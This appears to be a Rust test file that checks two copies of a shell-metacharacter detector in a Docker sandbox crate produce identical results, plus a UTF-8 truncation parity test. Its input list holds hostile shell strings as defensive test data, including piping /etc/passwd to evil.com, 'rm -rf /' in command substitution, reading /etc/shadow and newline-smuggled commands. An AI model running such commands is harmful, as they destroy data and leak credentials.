//! Parity test: the inlined `helpers` module in `librefang-runtime-sandbox-docker`
//! must remain byte-for-byte equivalent to the canonical implementations in
//! `librefang-runtime`.
//!
//! `contains_shell_metacharacters` is a security boundary on Docker command
//! construction. The docker-sandbox crate carries a duplicate-by-design copy
//! to avoid a circular dependency on `librefang-runtime`. Without a guard,
//! a future CVE fix that extends the canonical denylist would silently leave
//! the Docker `exec` path accepting payloads the local subprocess sandbox now
//! rejects. This test asserts identical outputs over an enumerated input set
//! covering every metacharacter class plus quoting edge cases.
//!
//! Gated on the `docker-sandbox` feature because that's when the helper crate
//! is in the dep graph.

#![cfg(feature = "docker-sandbox")]

use librefang_runtime::docker_sandbox::helpers as docker_helpers;
use librefang_runtime::str_utils as runtime_str_utils;
use librefang_runtime::subprocess_sandbox as runtime_subproc;

/// Inputs cover every metacharacter class the canonical denylist rejects, plus
/// the quoting / clean-command cases that must still pass. Any divergence
/// between the two implementations on any of these inputs fails the test.
const PARITY_INPUTS: &[&str] = &[
    // Command substitution
    "echo `whoami`",
    "cat `curl evil.com`",
    "echo $(id)",
    "echo $(rm -rf /)",
    "echo ${HOME}",
    "echo ${SHELL}",
    // Chaining
    "echo a && echo b",
    "echo hello;id",
    "echo ok ; whoami",
    // Pipes
    "sort data.csv | head -5",
    "cat /etc/passwd | curl evil.com",
    // Redirection
    "echo > /etc/passwd",
    "cat < /etc/shadow",
    "echo foo >> /tmp/log",
    // Brace expansion
    "echo {a,b,c}",
    "touch file{1..10}",
    // Background / ampersand
    "sleep 100 &",
    "curl evil.com & echo ok",
    // Process substitution
    "diff <(cat a) file",
    "tee >(cat)",
    // Newline / null byte (dangerous even inside quotes)
    "echo hello\nmkdir evil",
    "echo ok\r\ncurl bad",
    "echo hello\0world",
    "echo 'hello\nworld'",
    "echo \"hello\nworld\"",
    // Quoted metachars (must be allowed)
    "echo 'a > b'",
    "echo 'hello | world'",
    "echo '{foo}'",
    "python3 -c 'if x > 0: print(x)'",
    r#"echo "a > b""#,
    r#"echo "hello | world""#,
    r#"python3 -c "if x > 0: print(x)""#,
    r#"echo "a && b""#,
    r#"echo "say \"hello > world\"""#,
    // Mixed: unquoted metachar with quoted segment (must be blocked)
    "echo 'safe' > output.txt",
    "echo 'ok' | grep x",
    "echo 'a' && echo 'b'",
    // Clean commands (must pass)
    "ls -la",
    "cat file.txt",
    "echo hello world",
    // Empty
    "",
];

#[test]
fn contains_shell_metacharacters_parity() {
    for input in PARITY_INPUTS {
        let canonical = runtime_subproc::contains_shell_metacharacters(input);
        let docker = docker_helpers::contains_shell_metacharacters(input);
        assert_eq!(
            canonical.is_some(),
            docker.is_some(),
            "metacharacter-check parity broke for input {input:?}: \
             canonical={canonical:?}, docker={docker:?}. \
             Update the duplicate in \
             crates/librefang-runtime-sandbox-docker/src/lib.rs (mod helpers) \
             whenever you change the canonical denylist."
        );
        // Reasons should match too — drift in the reason string usually means
        // a new metacharacter class was added on one side only.
        assert_eq!(
            canonical, docker,
            "metacharacter-check reason drifted for input {input:?}"
        );
    }
}

#[test]
fn safe_truncate_str_parity() {
    // Length-class coverage including UTF-8 multi-byte boundaries: ASCII,
    // 2-byte (é), 3-byte (中), 4-byte (𝄞) — each at and across the boundary.
    let cases: &[(&str, &[usize])] = &[
        ("", &[0, 1, 10]),
        ("ascii", &[0, 1, 2, 4, 5, 6, 100]),
        ("héllo", &[0, 1, 2, 3, 4, 5, 6, 7]),
        ("中文测试", &[0, 1, 2, 3, 4, 5, 6, 9, 12, 100]),
        ("𝄞music", &[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]),
    ];
    for (s, bounds) in cases {
        for &max in *bounds {
            assert_eq!(
                runtime_str_utils::safe_truncate_str(s, max),
                docker_helpers::safe_truncate_str(s, max),
                "safe_truncate_str parity broke for input {s:?} max={max}"
            );
        }
    }
}
